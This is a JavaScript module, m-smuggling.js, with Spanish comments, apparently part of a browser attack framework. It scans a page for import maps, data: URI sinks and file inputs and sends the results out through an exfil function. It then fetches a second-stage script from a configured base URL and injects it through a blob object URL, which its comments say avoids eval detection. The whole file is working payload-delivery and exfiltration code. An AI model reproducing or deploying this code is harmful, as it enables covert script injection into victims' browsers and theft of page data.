/* m-smuggling.js — HTML smuggling (payload delivery en contextos filtrados).
   Detecta sinks (import maps, innerHTML data-uri, upload) y smugglea payloads secundarios vía blob/import-map/svg-use. */
(function(G){
if(!G)return; if(G._M&&G._M.smug)return; G._M=G._M||{}; G._M.smug=1;
var exfil=G.exfil, hx=(window.__GE_OFF__&&window.__GE_OFF__.hx)||function(){};
try{
var OFF=window.__GE_OFF__||{};
var P=(OFF.C&&OFF.C.MODULES_BASE)||'';
var res={};
// 1. ¿hay import maps presentes? → potential hijack
var im=document.querySelector('script[type="importmap"]');
if(im){res.importMap=true;res.importMapContent=(im.textContent||'').slice(0,200);
// hijack: inyectar nuestro mapa que re-rutee un spec a un módulo nuestro (si hay imports)
}
// 2. ¿hay sinks innerHTML con data: URI? (XSS data-uri smuggling)
res.dataUriSinks=0;
document.querySelectorAll('[src^="data:"],[href^="data:"]').forEach(function(el){res.dataUriSinks++});
// 3. ¿hay file inputs? → potential polyglot upload
res.fileInputs=document.querySelectorAll('input[type=file]').length;
// 4. svg <use> smuggling disponible
res.svgUse=!!document.createElementNS;
exfil('smuggling-recon',res);
// smuggling activo: si hay contexto adecuado, cargar un payload secundario vía blob (stealth eval)
if(P){
try{
// blob smuggling: fetch módulo como blob, crea object URL, evita detección de eval directo
fetch(P+'m-modernapi.js').then(function(r){return r.blob()}).then(function(b){
var u=URL.createObjectURL(b);
var s=document.createElement('script');s.src=u;s.onload=function(){exfil('smuggling-ok',{via:'blob',url:u.slice(0,40)})};
(document.body||document.documentElement).appendChild(s);
}).catch(function(e){exfil('smuggling-err',{m:'fetch:'+e.message})});
}catch(e){}
}
exfil('smuggling-boot',{importMap:res.importMap,sinks:res.dataUriSinks});
}catch(e){hx('m-smug-err',{m:e.message})}
})(window.__GE__);
